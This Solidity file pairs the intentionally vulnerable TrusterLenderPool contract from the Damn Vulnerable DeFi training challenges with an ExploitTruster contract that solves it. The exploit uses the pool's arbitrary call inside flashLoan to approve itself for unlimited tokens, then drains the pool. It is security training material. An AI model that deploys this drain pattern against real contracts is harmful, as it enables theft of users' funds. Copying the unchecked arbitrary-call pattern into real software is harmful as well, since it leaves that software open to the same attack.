// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}

contract ExploitTruster {
    IERC20 public immutable token;
    TrusterLenderPool public immutable pool;
    uint256 constant public MAX_INT_NUMBER = 
    115792089237316195423570985008687907853269984665640564039457584007913129639935;

    constructor (address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
    }

    function drainFundsFromPool () public {

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), MAX_INT_NUMBER
        );
        //Call the flashloan() function with borrowAmount set to 0
        pool.flashLoan(0, msg.sender, address(token), data);

        //once the ExploitTrsuter contract address has approval of the tokens
        //transfer all the tokens to the EOA who calls the function
        token.transferFrom(address(pool) , msg.sender, token.balanceOf(address(pool)));
    }
}